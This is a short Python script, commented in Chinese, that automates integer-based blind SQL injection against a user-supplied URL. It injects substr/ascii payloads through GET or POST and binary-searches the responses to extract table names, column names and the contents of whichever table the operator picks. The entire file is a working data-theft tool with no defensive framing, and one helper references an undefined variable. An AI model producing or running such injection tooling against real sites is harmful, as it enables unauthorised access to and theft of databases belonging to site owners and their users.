#整数型SQL盲注
import requests
class SQL_Injection:
    tables = []
    columns = []
    database = {}
    data = []
    #初始化参数
    def __init__(self,url,requireMethod,rightTXT,rightID,errorID,useFunc):
        self.url = url
        self.requireMethod = requireMethod.lower()
        self.rightTXT = rightTXT
        self.rightID = rightID
        self.errorID = errorID
        self.useFunc = useFunc

    #获取数据库名
    def getDatabase(self):
        payload = self.useFunc+"(ascii(substr((database()),%d,1))>%d,"+self.rightID+","+errorID+")"
        print("result:"+self.getResult(payload))

    #获取表名
    def getTables(self):
        payload = self.useFunc+"(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d,"+self.rightID+","+self.errorID+")"
        self.tables = self.getResult(payload).split(',')
        print("result:"+str(self.tables))

    #获取各个表的列名
    def getColumns(self):
        for table in self.tables:
            payload = self.useFunc+"(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='"+table+"')),%d,1))>%d,"+self.rightID+","+self.errorID+")"
            self.columns = self.getResult(payload).split(',')
            self.database[table] = self.columns
            print("result:"+str(self.columns))
        print(self.database)
    
    #获取数据
    def getData(self,table,columns):
        payload = self.useFunc+"(ascii(substr((select(group_concat("+columns+"))from("+table+")),%d,1))>%d,"+self.rightID+","+self.errorID+")"
        self.data = self.getResult(payload).split(',')
        print("result:"+str(self.data))
    
    #公共函数，发送请求
    def getResult(self,payload):
        result = ''
        i = 1
        while True:
            low,high = 32,126
            mid = (low+high) // 2
            while low < high:
                if self.requireMethod == 'get':
                    resp = requests.get(self.url+payload % (i,mid))
                elif self.requireMethod == 'post':
                    resp = requests.post(self.url,payload % (i,mid))
                if self.rightTXT in resp.text:
                    low = mid + 1
                else:
                    high = mid
                mid = (low + high) // 2
            if(chr(mid) == ' '):#如果是空格就证明找完了
                break
            i = i + 1
            result += chr(mid)
            print(result)
        return result


if __name__ == "__main__":
    url = input("input url(e.g,'get:www.example.com?id=,post:www.example.com'):")#url
    requireMethod = input("input require method(Get/Post):")#请求提交方式
    rightTXT = input("input right string:")#正确结果的特征
    rightID = input("input right id(the number while be used when the result is right):")#正确是使用的数字
    errorID = input("input error id:")
    useFunc = input("select function(if/elt):")
    work = SQL_Injection(url,requireMethod,rightTXT,rightID,errorID,useFunc)
    work.getTables()
    work.getColumns()
    while True:
        table = input("input table which you want to dump:")
        print("columns:"+str(work.database[table]))
        columns = input("input columns(split by ','):")
        work.getData(table,columns)
